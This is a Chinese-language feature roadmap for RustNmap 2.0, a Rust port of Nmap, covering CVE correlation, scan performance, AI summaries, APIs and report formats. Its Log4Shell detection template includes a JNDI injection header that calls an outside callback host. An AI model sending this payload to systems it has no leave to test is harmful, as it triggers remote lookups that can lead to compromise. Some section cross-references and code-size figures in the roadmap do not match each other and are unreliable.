# RETHINK.md -- RustNmap 2.0 进化路线图

> 从"端口扫描器"到"攻击面管理平台"的进化之路

## 1. 引言与愿景

### 1.1 RustNmap 1.0 基线

RustNmap 1.0.0 已实现与 Nmap 的 100% 功能对等：

| 指标 | 数值 |
|------|------|
| 代码总量 | 35,356 行 |
| 工作区 Crate 数 | 14 |
| 通过测试数 | 970+ |
| 代码覆盖率 | 75.09% |
| 编译器/Clippy 警告 | 0 |
| 安全审计评级 | A- |
| 扫描类型 | 12 种 (SYN/Connect/FIN/NULL/XMAS/ACK/Window/Maimon/UDP/SCTP 等) |
| 输出格式 | 5 种 (Normal/XML/JSON/Grepable/ScriptKiddie) |
| NSE 引擎 | 完整 Lua 5.4，含 nmap/stdnse/comm 库 |

### 1.2 为什么需要 2.0

Nmap 诞生于 1997 年，其核心架构存在以下固有局限：

1. **无漏洞关联能力** -- 发现开放端口和服务版本后，安全人员需手动查询 CVE 数据库
2. **单机串行架构** -- 无法利用现代多核/分布式计算能力
3. **输出不可流式消费** -- 必须等待扫描完成才能获取结果
4. **无状态管理** -- 无法对比历史扫描、追踪资产变化
5. **脚本生态封闭** -- NSE 脚本缺乏包管理和社区分发机制
6. **无 API 接口** -- 难以集成到自动化安全流水线

RustNmap 2.0 的目标是在保持 Nmap 兼容性的基础上，解决这些根本性缺陷。

### 1.3 三大核心目标

```
                    +-------------------+
                    |   攻击面管理平台    |
                    +-------------------+
                   /         |          \
          +-------+    +--------+    +--------+
          | 漏洞   |    | AI     |    | 平台化  |
          | 智能化  |    | 驱动   |    | 集成   |
          +-------+    +--------+    +--------+
          CVE关联       智能扫描       REST API
          EPSS评分      NLP分析       模板引擎
          KEV标记       LLM解读       SDK/绑定
```

---

## 2. 漏洞情报集成 (P0 -- 最高优先级)

### 2.1 问题描述

当前 `ServiceInfo` 已包含 `cpe: Vec<String>` 字段（`crates/rustnmap-output/src/models.rs:226`），OS 检测结果 `OsMatch` 同样有 `cpe: Vec<String>`（`models.rs:265`），但这些 CPE 标识符仅用于输出展示，未与任何漏洞数据库关联。安全人员拿到扫描结果后，仍需手动逐一查询 NVD。

### 2.2 方案

新建 `rustnmap-vuln` crate，实现 CPE -> CVE 自动关联：

```
rustnmap-vuln/
├── src/
│   ├── lib.rs           # 公共 API
│   ├── nvd.rs           # NVD JSON Feed 解析器
│   ├── cpe_match.rs     # CPE 匹配引擎 (支持通配符版本范围)
│   ├── epss.rs          # EPSS 可利用性评分
│   ├── kev.rs           # CISA KEV (已知被利用漏洞) 标记
│   ├── db.rs            # 本地 SQLite 存储
│   └── api.rs           # NVD API 2.0 在线查询
└── data/
    └── schema.sql       # 数据库 Schema
```

核心数据流：

```
ServiceInfo.cpe ──┐
                  ├──> CPE 匹配引擎 ──> CVE 列表 ──> EPSS 评分 ──> 风险排序
OsMatch.cpe ─────┘                                  ──> KEV 标记
```

在 `HostResult` 中新增漏洞字段：

```rust
// 扩展 crates/rustnmap-output/src/models.rs 中的 HostResult
pub struct HostResult {
    // ... 现有字段 ...
    /// 关联的漏洞信息
    pub vulnerabilities: Vec<VulnInfo>,
}

pub struct VulnInfo {
    pub cve_id: String,          // CVE-2024-XXXXX
    pub cvss_v3: f32,            // CVSS 3.1 评分
    pub epss_score: f32,         // EPSS 可利用性概率
    pub is_kev: bool,            // 是否在 CISA KEV 列表中
    pub affected_cpe: String,    // 匹配的 CPE
    pub description: String,     // 漏洞描述
}
```

两种工作模式：
- **离线模式**: 定期下载 NVD JSON Feed 到本地 SQLite，扫描时本地查询
- **在线模式**: 通过 NVD API 2.0 实时查询（需 API Key，有速率限制）

### 2.3 复杂度与依赖

| 项目 | 评估 |
|------|------|
| 新增代码量 | ~3,000 行 |
| 新增依赖 | rusqlite, reqwest (已有) |
| 对现有代码的侵入 | 低 -- 仅扩展 HostResult 和输出格式化器 |
| 数据库大小 | NVD 全量约 2GB，压缩后 ~300MB |

### 2.4 优先级理由

这是 RustNmap 超越 Nmap 最直接、用户感知最强的功能。masscan/rustscan 等竞品同样缺乏此能力，而 Nuclei 虽有漏洞检测但缺乏端口扫描深度。将两者结合是独特的差异化优势。

---

## 3. AI/ML 智能化 (P2-P3)

### 3.1 问题描述

传统扫描器的行为完全由静态规则驱动：固定的超时参数、基于正则的 banner 匹配、预定义的脚本选择逻辑。面对复杂多变的网络环境，这种刚性策略既低效又容易遗漏。

### 3.2 方案

#### 3.2.1 智能扫描时序优化 (P2)

当前时序控制在 `ScanConfig`（`crates/rustnmap-core/src/session.rs:178-226`）中通过 `TimingTemplate` 静态配置。改进方向：

- 收集每个目标的 RTT、丢包率、响应模式等特征
- 训练轻量级 ML 模型（决策树/随机森林），预测最优 timing 参数
- 运行时自适应调整 `max_parallel_ports`、`scan_delay`、`host_timeout`

```
初始参数 ──> 探测阶段 (少量端口) ──> 特征提取 ──> 模型预测 ──> 调整参数 ──> 全量扫描
```

#### 3.2.2 Banner 智能分类 (P2)

当前服务检测依赖 nmap-service-probes 的正则匹配。对于非标准 banner 或混淆响应，匹配率低。

- 使用预训练的文本分类模型（可用 ONNX Runtime 本地推理）
- 对未匹配的 banner 进行语义分析，提升未知服务识别率
- 模型体积控制在 50MB 以内，不影响工具分发

#### 3.2.3 AI 扫描结果解读 (P3)

集成 LLM API（OpenAI/Anthropic），对扫描结果进行自然语言总结：

```
$ rustnmap -sS -sV --ai-summary 192.168.1.0/24

[扫描结果...]

=== AI 安全评估 ===
发现 3 台高风险主机：
- 192.168.1.10: 运行过时的 Apache 2.4.29，存在 CVE-2021-44790 (CVSS 9.8)
- 192.168.1.15: SSH 允许密码认证，建议切换为密钥认证
- 192.168.1.20: MySQL 3306 端口暴露在外网，建议限制访问来源
建议优先处理 192.168.1.10 的 Apache 升级。
```

#### 3.2.4 智能 NSE 脚本推荐 (P2)

当前 `ScriptDatabase`（`crates/rustnmap-nse/src/registry.rs:17`）通过 `by_port` 和 `by_service` 索引选择脚本。改进为基于发现的完整上下文（服务+版本+OS+已知漏洞）智能推荐最相关的脚本组合。

#### 3.2.5 自然语言扫描配置 (P3)

```
$ rustnmap --nl "扫描我的 Web 服务器，查找高危漏洞，不要太激进"
# 自动转换为: rustnmap -sS -sV --script=vuln -T3 -p 80,443,8080,8443 <target>
```

### 3.3 复杂度与依赖

| 子功能 | 新增代码量 | 新增依赖 | 优先级 |
|--------|-----------|---------|--------|
| 时序优化 | ~1,500 行 | smartcore 或自实现决策树 | P2 |
| Banner 分类 | ~1,000 行 | ort (ONNX Runtime) | P2 |
| AI 解读 | ~800 行 | reqwest (已有) | P3 |
| 脚本推荐 | ~600 行 | 无新依赖 | P2 |
| 自然语言配置 | ~500 行 | reqwest (已有) | P3 |

---

## 4. 性能与扫描策略 (P0-P1)

### 4.1 问题描述

当前扫描流水线（`crates/rustnmap-core/src/orchestrator.rs:29-46`）采用 8 阶段顺序执行：

```
TargetParsing -> HostDiscovery -> PortScanning -> ServiceDetection
-> OsDetection -> NseExecution -> Traceroute -> ResultAggregation
```

这种严格的阶段划分导致：
- 端口扫描必须等待所有主机发现完成
- 无法在发现开放端口后立即启动服务检测
- 大规模扫描时前期阶段成为瓶颈

### 4.2 方案

#### 4.2.1 两阶段自适应扫描 (P0)

借鉴 RustScan 的核心思路，但更精细：

```
阶段 1: 快速端口发现
├── 无状态 SYN 扫描 (类 masscan)
├── 仅判断 open/closed，不做服务检测
├── 最大化并发，最小化每包开销
└── 输出: 活跃主机 + 开放端口列表

阶段 2: 精细分析 (仅针对阶段 1 发现的开放端口)
├── 服务版本检测 (-sV)
├── OS 指纹识别 (-O)
├── NSE 脚本执行 (--script)
├── 漏洞关联 (--vuln)
└── 输出: 完整扫描报告
```

关键优化：阶段 2 以流水线方式处理，每个主机独立推进，不等待其他主机。

#### 4.2.2 io_uring 异步后端 (P1)

当前使用 tokio 的 epoll 后端。Linux 5.1+ 的 io_uring 在高并发 I/O 场景下性能显著优于 epoll：

- 减少系统调用次数（批量提交/完成）
- 零拷贝网络 I/O
- 通过 `tokio-uring` 或 `io-uring` crate 集成
- 保持 `PacketEngine` trait（`session.rs:80`）抽象，新增 `IoUringPacketEngine` 实现

#### 4.2.3 无状态快速扫描模式 (P0)

类 masscan 的 stateless SYN 扫描：

- 使用加密 cookie 编码源端口/序列号，无需维护连接状态表
- 发送和接收完全解耦（独立线程/协程）
- 理论上可达到线速扫描
- 作为 `--fast` 或 `-F2` 选项暴露

#### 4.2.4 自适应批量大小 (P1)

当前 `max_parallel_ports` 在 `ScanConfig`（`session.rs:211`）中硬编码为 1024。改进为：

```rust
// 运行时动态计算
fn calculate_batch_size() -> usize {
    let fd_limit = get_ulimit_nofile();
    let available_memory = get_available_memory();
    let cpu_cores = num_cpus::get();

    // 保留 20% fd 给系统，每个扫描连接约占 1 fd
    let fd_based = (fd_limit as f64 * 0.8) as usize;
    // 每个连接约占 2KB 内存
    let mem_based = available_memory / 2048;
    // CPU 核心数 * 256 作为上限参考
    let cpu_based = cpu_cores * 256;

    fd_based.min(mem_based).min(cpu_based).max(64)
}
```

### 4.3 复杂度与依赖

| 子功能 | 新增代码量 | 新增依赖 | 优先级 |
|--------|-----------|---------|--------|
| 两阶段扫描 | ~2,000 行 | 无 | P0 |
| io_uring 后端 | ~1,500 行 | io-uring | P1 |
| 无状态扫描 | ~1,800 行 | 无 | P0 |
| 自适应批量 | ~300 行 | 无 | P1 |

---

---

## 5. 用户体验 (P1-P2)

### 5.1 问题描述

Nmap 和当前 RustNmap 的用户交互停留在"启动 -> 等待 -> 输出"的批处理模式。对于大规模扫描，用户在漫长等待中无法了解进度，也无法中途调整策略。

### 5.2 方案

#### 5.2.1 TUI 实时仪表盘 (P1)

新建 `rustnmap-tui` crate，基于 `ratatui` 实现终端 UI：

```
+--[ RustNmap v2.1 ]------------------------------------------+
| 目标: 192.168.1.0/24  扫描类型: SYN  时序: T4               |
+-------------------------------------------------------------+
| 进度: [████████████░░░░░░░░] 62% (159/256 主机)             |
| 速率: 12,450 包/秒  已用时: 00:01:23  预计剩余: 00:00:51   |
+-------------------------------------------------------------+
| 最新发现:                                                    |
| 192.168.1.10  22/tcp open  ssh     OpenSSH 8.9p1            |
| 192.168.1.10  80/tcp open  http    nginx 1.18.0             |
| 192.168.1.15  443/tcp open https   Apache 2.4.52            |
| 192.168.1.20  3306/tcp open mysql  MySQL 8.0.32             |
+-------------------------------------------------------------+
| [q]退出 [p]暂停 [+]加速 [-]减速 [v]详细 [s]统计            |
+-------------------------------------------------------------+
```

通过 `--tui` 选项启用，不影响默认的传统输出模式。

#### 5.2.2 流式输出 (P1)

当前 `OutputSink` trait（`crates/rustnmap-core/src/session.rs:130`）已定义 `output_host` 方法，但 `DefaultOutputSink`（`session.rs:792`）实现为空操作。改进为：

- 实现真正的流式输出：每完成一个主机的扫描立即输出结果
- 支持 NDJSON 流式格式（每行一个 JSON 对象），便于管道处理
- `--stream` 选项启用流式模式

```bash
# 流式输出 + 管道处理
rustnmap -sS -sV --stream --json 192.168.1.0/24 | jq '.ports[] | select(.state=="open")'
```

#### 5.2.3 Shell 补全脚本 (P1)

当前 CLI 使用 clap（`crates/rustnmap-cli/src/args.rs:21`），clap 原生支持生成补全脚本：

```bash
# 生成补全脚本
rustnmap --generate-completion bash > /etc/bash_completion.d/rustnmap
rustnmap --generate-completion zsh > ~/.zfunc/_rustnmap
rustnmap --generate-completion fish > ~/.config/fish/completions/rustnmap.fish
```

实现成本极低，仅需在 CLI 中添加 `clap_complete` 集成。

#### 5.2.4 扫描暂停/恢复 (P2)

当前 `ResumeStore`（`crates/rustnmap-core/src/session.rs:695`）是一个空 stub，仅包含 `path` 字段和构造函数。需要实现完整的状态序列化：

```rust
// 需要实现的 ResumeStore 完整功能
impl ResumeStore {
    /// 保存扫描状态到磁盘
    pub async fn save_state(&self, state: &ScanState) -> Result<()>;
    /// 从磁盘恢复扫描状态
    pub async fn load_state(&self) -> Result<ScanState>;
    /// 检查是否存在可恢复的会话
    pub fn has_resume_data(&self) -> bool;
}
```

序列化内容包括：已扫描的主机/端口列表、当前阶段、配置参数、中间结果。使用 bincode 序列化以最小化磁盘占用。

#### 5.2.5 交互式模式 (P2)

扫描过程中支持动态调整：

- 按键添加/移除目标
- 动态调整时序模板
- 跳过当前主机
- 实时查看已完成主机的详细结果

### 5.3 复杂度与依赖

| 子功能 | 新增代码量 | 新增依赖 | 优先级 |
|--------|-----------|---------|--------|
| TUI 仪表盘 | ~2,000 行 | ratatui, crossterm | P1 |
| 流式输出 | ~500 行 | 无新依赖 | P1 |
| Shell 补全 | ~100 行 | clap_complete | P1 |
| 暂停/恢复 | ~800 行 | bincode | P2 |
| 交互式模式 | ~1,200 行 | crossterm (已有) | P2 |

---

## 6. 可扩展性 (P1-P2)

### 6.1 问题描述

当前扫描类型通过硬编码枚举定义（`crates/rustnmap-core/src/session.rs:231`，12 个变体），NSE 脚本需要本地部署，缺乏社区分发机制。`ScriptDatabase`（`crates/rustnmap-nse/src/registry.rs:17`）仅支持从本地目录加载脚本。

### 6.2 方案

#### 6.2.1 YAML 模板引擎 (P1)

借鉴 Nuclei 的模板系统，新建 `rustnmap-template` crate：

```yaml
# templates/cves/CVE-2021-44228.yaml
id: CVE-2021-44228
info:
  name: Apache Log4j RCE (Log4Shell)
  severity: critical
  cvss: 10.0
  tags: cve,rce,log4j

match:
  service: http
  product: Apache*
  version: "< 2.17.0"

detect:
  - type: http
    method: GET
    path: /
    headers:
      X-Api-Version: "${jndi:ldap://{{interactsh-url}}}"
    matchers:
      - type: interactsh
        protocol: dns

  - type: banner
    pattern: "log4j"
```

模板引擎与现有 NSE 引擎互补：
- NSE: 复杂的交互式检测逻辑
- YAML 模板: 声明式的简单匹配规则，降低贡献门槛

#### 6.2.2 NSE 脚本远程仓库 (P2)

```bash
# 从官方仓库更新脚本
rustnmap --update-scripts

# 从自定义仓库安装
rustnmap --install-scripts https://github.com/user/nse-scripts

# 列出已安装脚本
rustnmap --list-scripts
```

当前 `DatabaseUpdater`（`crates/rustnmap-fingerprint/src/database/updater.rs:46`）仅支持从 Nmap SVN 下载指纹数据库。扩展为通用的资源更新框架，支持 Git 仓库作为脚本源。

#### 6.2.3 插件系统 (P2)

支持动态加载自定义扫描类型，突破硬编码枚举的限制：

```rust
// 插件 trait
pub trait ScanPlugin: Send + Sync {
    fn name(&self) -> &str;
    fn scan_port(&self, target: &Target, port: u16) -> Result<PortResult>;
    fn supported_protocols(&self) -> &[Protocol];
}

// 通过 dylib 动态加载
let plugin = load_plugin("libcustom_scan.so")?;
```

### 6.3 复杂度与依赖

| 子功能 | 新增代码量 | 新增依赖 | 优先级 |
|--------|-----------|---------|--------|
| YAML 模板引擎 | ~2,500 行 | serde_yaml | P1 |
| 脚本远程仓库 | ~1,000 行 | git2 | P2 |
| 插件系统 | ~1,500 行 | libloading | P2 |

---

## 7. 集成与生态 (P1-P2)

### 7.1 问题描述

Nmap 是一个独立的命令行工具，缺乏与现代安全工具链的原生集成能力。在 DevSecOps 流水线中，通常需要编写大量胶水代码来解析 Nmap 输出并传递给下游工具。

### 7.2 方案

#### 7.2.1 REST API / Daemon 模式 (P1)

新建 `rustnmap-api` crate，基于 axum 实现 HTTP API：

```
POST /api/v1/scans              # 创建扫描任务
GET  /api/v1/scans/{id}         # 查询扫描状态
GET  /api/v1/scans/{id}/results # 获取扫描结果
DELETE /api/v1/scans/{id}       # 取消扫描
GET  /api/v1/scans/{id}/stream  # SSE 流式结果推送
GET  /api/v1/health             # 健康检查
```

```bash
# 启动 daemon 模式
rustnmap --daemon --listen 127.0.0.1:8080 --api-key <key>

# 通过 API 发起扫描
curl -X POST http://localhost:8080/api/v1/scans \
  -H "Authorization: Bearer <key>" \
  -d '{"targets": ["192.168.1.0/24"], "scan_type": "syn", "options": {"service_detection": true}}'
```

#### 7.2.2 Pipeline 友好 (P1)

NDJSON 流式输出，与现代安全工具链无缝衔接：

```bash
# RustNmap -> httpx -> nuclei 工具链
rustnmap -sS -p 80,443 --stream --ndjson 192.168.1.0/24 \
  | jq -r 'select(.ports[].state=="open") | .ip' \
  | httpx -silent \
  | nuclei -t cves/
```

### 7.3 复杂度与依赖

| 子功能 | 新增代码量 | 新增依赖 | 优先级 |
|--------|-----------|---------|--------|
| REST API | ~2,000 行 | axum, tower | P1 |
| NDJSON 流式 | ~300 行 | 无新依赖 | P1 |

---

## 8. 输出与报告 (P1-P2)

### 8.1 问题描述

当前 `OutputFormatter` trait（`crates/rustnmap-output/src/formatter.rs:54`）支持 5 种格式：Normal、XML、JSON、Grepable、ScriptKiddie。这些格式面向技术人员，缺乏面向管理层的可视化报告和面向自动化平台的标准安全格式。

### 8.2 方案

#### 8.2.1 HTML 报告 (P1)

生成自包含的单文件 HTML 报告（内嵌 CSS/JS），包含：

- 扫描概览仪表盘（主机数、端口分布、风险统计）
- 交互式主机列表（可展开查看端口/服务/漏洞详情）
- 风险热力图（按 CVSS 评分着色）
- 端口状态分布饼图
- 时间线视图（扫描各阶段耗时）

```bash
rustnmap -sS -sV -oH report.html 192.168.1.0/24
```

#### 8.2.2 SARIF 格式 (P1)

Static Analysis Results Interchange Format，GitHub/GitLab Security Dashboard 原生支持：

```bash
rustnmap -sS -sV --vuln -oS results.sarif 192.168.1.0/24
# 结果可直接上传到 GitHub Security tab
gh api repos/{owner}/{repo}/code-scanning/sarifs -f sarif=@results.sarif
```

#### 8.2.3 OCSF 格式 (P2)

Open Cybersecurity Schema Framework，Amazon Security Lake 等 SIEM 平台的标准格式：

```json
{
  "class_uid": 2002,
  "class_name": "Vulnerability Finding",
  "activity_id": 1,
  "finding": {
    "title": "CVE-2021-44228 - Log4Shell",
    "uid": "CVE-2021-44228",
    "types": ["Software Vulnerability"]
  },
  "vulnerabilities": [{
    "cve": {"uid": "CVE-2021-44228"},
    "cvss": [{"base_score": 10.0, "version": "3.1"}]
  }]
}
```

#### 8.2.4 Markdown 报告 (P1)

便于嵌入 Wiki、Issue Tracker 和文档系统：

```bash
rustnmap -sS -sV -oM report.md 192.168.1.0/24
```

### 8.3 复杂度与依赖

| 子功能 | 新增代码量 | 新增依赖 | 优先级 |
|--------|-----------|---------|--------|
| HTML 报告 | ~1,500 行 | 无 (模板内嵌) | P1 |
| SARIF 格式 | ~600 行 | 无新依赖 (serde 已有) | P1 |
| OCSF 格式 | ~500 行 | 无新依赖 | P2 |
| Markdown 报告 | ~400 行 | 无新依赖 | P1 |

---

## 9. 扫描管理 (P1-P2)

### 9.1 问题描述

每次扫描都是独立的一次性操作，无法追踪网络资产的变化趋势。安全团队需要手动对比不同时间点的扫描结果来发现变化。

### 9.2 方案

#### 9.2.1 扫描结果 Diff (P1)

```bash
# 对比两次扫描结果
rustnmap --diff scan_20240101.xml scan_20240201.xml

# 输出示例
=== 扫描结果对比 ===
新增主机 (2):
  + 192.168.1.50 (首次发现)
  + 192.168.1.51 (首次发现)

消失主机 (1):
  - 192.168.1.30 (上次在线，本次未响应)

端口变化 (3):
  192.168.1.10:
    + 8443/tcp open  (新增)
    ~ 80/tcp: nginx 1.18.0 -> nginx 1.24.0 (版本变更)
  192.168.1.15:
    - 21/tcp closed (已关闭)

新增漏洞 (1):
  192.168.1.10: CVE-2024-XXXXX (CVSS 8.1) -- nginx 1.24.0
```

#### 9.2.2 扫描结果持久化 (P1)

使用 SQLite 存储历史扫描结果：

```sql
-- 核心表结构
CREATE TABLE scans (
    id INTEGER PRIMARY KEY,
    started_at TIMESTAMP,
    completed_at TIMESTAMP,
    command_line TEXT,
    target_spec TEXT,
    scan_type TEXT
);

CREATE TABLE host_results (
    id INTEGER PRIMARY KEY,
    scan_id INTEGER REFERENCES scans(id),
    ip_addr TEXT,
    hostname TEXT,
    status TEXT,
    os_match TEXT
);

CREATE TABLE port_results (
    id INTEGER PRIMARY KEY,
    host_id INTEGER REFERENCES host_results(id),
    port INTEGER,
    protocol TEXT,
    state TEXT,
    service_name TEXT,
    service_version TEXT,
    cpe TEXT
);
```

```bash
# 查询历史扫描
rustnmap --history
rustnmap --history --target 192.168.1.10
rustnmap --history --since 2024-01-01
```

#### 9.2.3 定时扫描调度 (P2)

内置 cron 式调度器：

```bash
# 每天凌晨 2 点扫描
rustnmap --schedule "0 2 * * *" -sS -sV 192.168.1.0/24

# 每周一全端口扫描
rustnmap --schedule "0 0 * * 1" -sS -p- 10.0.0.0/8
```

调度状态持久化到 SQLite，支持 daemon 模式下的多任务调度。

#### 9.2.4 扫描配置即代码 (P1)

```yaml
# scan-profiles/weekly-internal.yaml
name: 内网周扫描
description: 每周内网安全基线检查
targets:
  - 192.168.0.0/16
  - 10.0.0.0/8
exclude:
  - 10.0.0.1  # 网关，跳过
scan:
  type: syn
  ports: "1-10000"
  service_detection: true
  os_detection: true
  scripts: ["default", "vuln"]
timing: T3
output:
  formats: [json, html, sarif]
  directory: /var/lib/rustnmap/reports/
notifications:
  - type: webhook
    url: https://hooks.slack.com/xxx
    on: [high_vuln_found]
```

```bash
rustnmap --profile scan-profiles/weekly-internal.yaml
```

### 9.3 复杂度与依赖

| 子功能 | 新增代码量 | 新增依赖 | 优先级 |
|--------|-----------|---------|--------|
| 扫描 Diff | ~1,000 行 | 无新依赖 | P1 |
| 结果持久化 | ~1,500 行 | rusqlite | P1 |
| 定时调度 | ~800 行 | cron (crate) | P2 |
| 配置即代码 | ~600 行 | serde_yaml | P1 |

---

## 10. 云与现代基础设施 (P2-P3)

### 10.1 问题描述

Nmap 设计于传统数据中心时代，对容器化、云原生、CDN/WAF 等现代基础设施缺乏感知能力。扫描云环境时经常产生误报或遗漏。

### 10.2 方案

#### 10.2.1 容器/K8s 感知 (P2)

- 检测目标是否运行在容器中（通过 TTL、TCP 窗口大小等特征）
- 如果运行在 K8s 集群内部，通过 K8s API 关联 Pod/Service/Namespace 元数据
- 识别 Service Mesh (Istio/Linkerd) 的 sidecar proxy

#### 10.2.2 云资产发现 (P3)

集成主流云平台 API，自动发现扫描目标：

```bash
# 从 AWS 发现目标
rustnmap --cloud aws --region us-east-1 --filter "tag:env=production"

# 从 Azure 发现目标
rustnmap --cloud azure --subscription <id> --resource-group <rg>
```

支持的云平台：
- AWS: EC2、ELB、RDS、Lambda (通过 aws-sdk-rust)
- Azure: VM、App Service、AKS (通过 azure_mgmt_compute)
- GCP: Compute Engine、GKE、Cloud Run (通过 google-cloud-rust)

#### 10.2.3 CDN/WAF 检测 (P2)

在扫描前自动检测目标是否位于 CDN/WAF 后方：

- DNS 解析检测（CNAME 指向 CDN 域名）
- HTTP 响应头分析（Server、X-Cache、CF-Ray 等）
- TLS 证书分析（CDN 通配符证书）
- 检测到 CDN/WAF 时自动调整策略（避免触发封禁、标记结果为"CDN 后端"）

#### 10.2.4 分布式扫描 (P3)

多节点协同扫描大规模网络：

```
                    +--[ 控制节点 ]--+
                    |   任务分发     |
                    |   结果聚合     |
                    +-------+-------+
                   /        |        \
          +-------+  +-------+  +-------+
          | 节点 1 |  | 节点 2 |  | 节点 3 |
          | /24    |  | /24    |  | /24    |
          +-------+  +-------+  +-------+
```

- 基于 gRPC 的节点间通信
- 智能任务分片（按子网/端口范围划分）
- 结果自动聚合和去重
- 节点故障自动重分配

### 10.3 复杂度与依赖

| 子功能 | 新增代码量 | 新增依赖 | 优先级 |
|--------|-----------|---------|--------|
| 容器感知 | ~800 行 | kube (可选) | P2 |
| 云资产发现 | ~2,000 行 | aws-sdk-*, azure_*, google-cloud-* | P3 |
| CDN/WAF 检测 | ~600 行 | 无新依赖 | P2 |
| 分布式扫描 | ~4,000 行 | tonic (gRPC) | P3 |

---

## 11. 开发者体验 (P2)

### 11.1 问题描述

RustNmap 目前仅作为命令行工具使用。开发者如果想在自己的 Rust 项目中集成扫描能力，需要直接依赖内部 crate，面对不稳定的内部 API。

### 11.2 Library API (SDK) (P2)

新建 `rustnmap-sdk` crate，提供稳定的高层 API：

```rust
use rustnmap_sdk::{Scanner, ScanOptions, ScanResult};

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let scanner = Scanner::new()?;

    let result: ScanResult = scanner
        .targets(["192.168.1.0/24"])
        .ports("1-1000")
        .syn_scan()
        .service_detection(true)
        .run()
        .await?;

    for host in &result.hosts {
        println!("{}: {} open ports", host.ip, host.ports.len());
        for vuln in &host.vulnerabilities {
            println!("  {} (CVSS {})", vuln.cve_id, vuln.cvss_v3);
        }
    }

    Ok(())
}
```

SDK 设计原则：
- Builder 模式配置扫描参数
- 稳定的公共 API，内部实现可自由重构
- 完整的文档和示例
- 语义化版本控制

### 11.3 复杂度与依赖

| 子功能 | 新增代码量 | 新增依赖 | 优先级 |
|--------|-----------|---------|--------|
| Rust SDK | ~1,500 行 | 无新依赖 | P2 |

---

## 12. 实施路线图

### Phase 1 (v2.1) -- 用户体验与基础增强

**目标**: 让 RustNmap 在日常使用中显著优于 Nmap

| 功能 | 来源章节 | 优先级 | 预估代码量 |
|------|---------|--------|-----------|
| TUI 实时仪表盘 | 5.2.1 | P1 | ~2,000 行 |
| 流式输出 | 5.2.2 | P1 | ~500 行 |
| Shell 补全脚本 | 5.2.3 | P1 | ~100 行 |
| NDJSON Pipeline 输出 | 7.2.4 | P1 | ~300 行 |
| Markdown 报告 | 8.2.5 | P1 | ~400 行 |
| 扫描配置即代码 | 9.2.4 | P1 | ~600 行 |

**新增 Crate**: `rustnmap-tui`
**Phase 1 总计**: ~3,900 行

### Phase 2 (v2.2) -- 漏洞智能与性能突破

**目标**: 从端口扫描器进化为漏洞发现工具

| 功能 | 来源章节 | 优先级 | 预估代码量 |
|------|---------|--------|-----------|
| CVE/CPE 关联引擎 | 2.2 | P0 | ~3,000 行 |
| 两阶段自适应扫描 | 4.2.1 | P0 | ~2,000 行 |
| 无状态快速扫描 | 4.2.3 | P0 | ~1,500 行 |
| HTML 报告 | 8.2.1 | P1 | ~1,500 行 |
| SARIF 格式 | 8.2.3 | P1 | ~600 行 |
| 扫描结果 Diff | 9.2.1 | P1 | ~1,000 行 |
| 结果持久化 (SQLite) | 9.2.2 | P1 | ~1,500 行 |
| 暂停/恢复 | 5.2.4 | P2 | ~800 行 |

**新增 Crate**: `rustnmap-vuln`
**Phase 2 总计**: ~11,900 行
**依赖 Phase 1**: 流式输出基础设施

### Phase 3 (v2.3) -- 平台化与生态

**目标**: 成为安全工具链的核心组件

| 功能 | 来源章节 | 优先级 | 预估代码量 |
|------|---------|--------|-----------|
| REST API / Daemon | 7.2.1 | P1 | ~2,500 行 |
| YAML 模板引擎 | 6.2.1 | P1 | ~2,500 行 |
| NSE 脚本远程仓库 | 6.2.2 | P2 | ~1,000 行 |
| Rust SDK | 11.2.1 | P2 | ~1,500 行 |
| io_uring 后端 | 4.2.2 | P1 | ~2,000 行 |

**新增 Crate**: `rustnmap-template`, `rustnmap-api`, `rustnmap-sdk`
**Phase 3 总计**: ~9,500 行
**依赖 Phase 2**: CVE 引擎（API 需要暴露漏洞数据）、结果持久化（API 需要查询历史）

### Phase 4 (v2.5) -- AI 与未来

**目标**: 引入 AI 能力，拓展到云原生场景

| 功能 | 来源章节 | 优先级 | 预估代码量 |
|------|---------|--------|-----------|
| AI 扫描结果解读 | 3.2.3 | P3 | ~800 行 |
| 智能时序优化 | 3.2.1 | P2 | ~1,500 行 |
| Banner 智能分类 | 3.2.2 | P2 | ~1,000 行 |
| 插件系统 | 6.2.3 | P2 | ~1,500 行 |
| 云资产发现 | 10.2.2 | P3 | ~2,000 行 |
| 容器/K8s 感知 | 10.2.1 | P2 | ~800 行 |
| CDN/WAF 检测 | 10.2.3 | P2 | ~600 行 |
| 分布式扫描 | 10.2.4 | P3 | ~4,000 行 |

**Phase 4 总计**: ~12,200 行
**依赖 Phase 3**: SDK、API（分布式扫描基于 API）

### 路线图总览

```
v1.0 (当前)          v2.1              v2.2              v2.3              v2.5
    |                  |                 |                 |                 |
    +--[ Phase 1 ]-----+--[ Phase 2 ]---+--[ Phase 3 ]---+--[ Phase 4 ]---+
    |  用户体验        |  漏洞智能       |  平台化         |  AI/云原生     |
    |  ~3,900 行       |  ~11,900 行     |  ~9,500 行      |  ~12,200 行    |
    |  1 新 crate      |  1 新 crate     |  3 新 crate     |                |
```

**总计新增代码**: ~37,500 行
**总计新增 Crate**: 5 个

---

## 13. 新增 Crate 规划表

| Crate | 用途 | Phase | 预估代码量 | 核心依赖 |
|-------|------|-------|-----------|---------|
| `rustnmap-tui` | 终端实时仪表盘 | Phase 1 (v2.1) | ~2,000 行 | ratatui, crossterm |
| `rustnmap-vuln` | CVE/CPE 关联引擎 | Phase 2 (v2.2) | ~3,000 行 | rusqlite, reqwest |
| `rustnmap-template` | Nuclei 风格 YAML 模板引擎 | Phase 3 (v2.3) | ~2,500 行 | serde_yaml |
| `rustnmap-api` | REST API / Daemon 模式 | Phase 3 (v2.3) | ~2,500 行 | axum, tower |
| `rustnmap-sdk` | 稳定的高层 Rust Library API | Phase 3 (v2.3) | ~1,500 行 | 无新依赖 |

### Crate 依赖关系

```
rustnmap-sdk ──> rustnmap-core (封装内部 API)
rustnmap-api ──> rustnmap-core + rustnmap-vuln (API 需要漏洞数据)
rustnmap-tui ──> rustnmap-core (读取扫描状态)
rustnmap-vuln ──> rustnmap-output (扩展 HostResult 模型)
rustnmap-template ──> rustnmap-nse (复用脚本执行基础设施)
```

---

## 14. 关键代码锚点

以下是 2.0 开发中需要重点关注和扩展的现有代码位置：

| 文件 | 行号 | 内容 | 2.0 扩展方向 |
|------|------|------|-------------|
| `crates/rustnmap-output/src/models.rs` | 206-227 | `ServiceInfo` 结构体，含 `cpe` 字段 | 新增 `vulnerabilities` 字段 |
| `crates/rustnmap-output/src/models.rs` | 250-266 | `OsMatch` 结构体，含 `cpe` 字段 | CVE 关联 |
